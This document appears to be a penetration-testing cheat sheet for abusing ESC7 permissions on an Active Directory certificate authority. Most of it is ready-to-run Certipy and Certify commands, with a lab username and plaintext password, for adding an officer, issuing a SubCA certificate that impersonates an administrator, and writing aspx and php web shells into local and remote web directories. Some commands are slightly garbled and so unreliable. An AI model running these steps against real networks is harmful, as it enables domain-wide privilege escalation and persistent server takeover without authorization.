# General Overview

Certificate Authorities (CAs) are granted specific permissions to manage and secure operations. The ManageCA permission provides administrative control, allowing modifications to persistent configuration settings, such as enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. Conversely, the ManageCertificates permission permits the approval of pending certificate requests, which can override the need for manager approval.

# Abusing ESC7 Certificate Templates

## Scenario 1: 
If we find a user that has the Manage CA permission, we can add an Officer. This will grant us the Manage Certificates permission: 

## Certipy:
- certipy-ad ca -ca 'Vulnerable CA' -add-officer  -username afsimmons@megacorpone.com -password Spawn123!
- certipy-ad -ca -ca 'Vulnerable CA'  -enable-template SubCA -username afsimmons@megacorpone.com -password Spawn123!
If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the SubCA template:

- certipy-ad req -username afsimmons@megacorpone.com -password Spawn123! -ca corp-DC-CA -target ca.megacorpone.com -template SubCA -upn xadministrator@megacorpone.com
- certipy-ad ca -ca 'corp-DC-CA' -issue-request 785 -username afsimmons@megacorpone.com -password Spawn123!
- certipy-ad req -username afsimmons@megacorpone.com -password Spawn123! -ca corp-DC-CA -target ca.megacorpone.com -retrieve 785
## Certify
- Certify.exe setconfig /enablesan /restart
- Certify.exe request /template:corp-DC-CA /altname:xadministrator
- Certify.exe issue /id:[REQUEST ID]
- To disable: Certify.exe setconfig /removeapproval /restart
Alternative Technique:
- Get the current CDP list. Useful to find remote writable shares:
	Certify.exe writefile /ca:SERVER\ca-name /readonly

- Write an aspx shell to a local web directory:
	Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

- Write the default asp shell to a local web directory:
	Certify.exe writefile /ca:SERVER\ca-name /path:c:\\inetpub\\wwwroot\\shell.aspx
- Write a php shell to a remote web directory:
	Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php
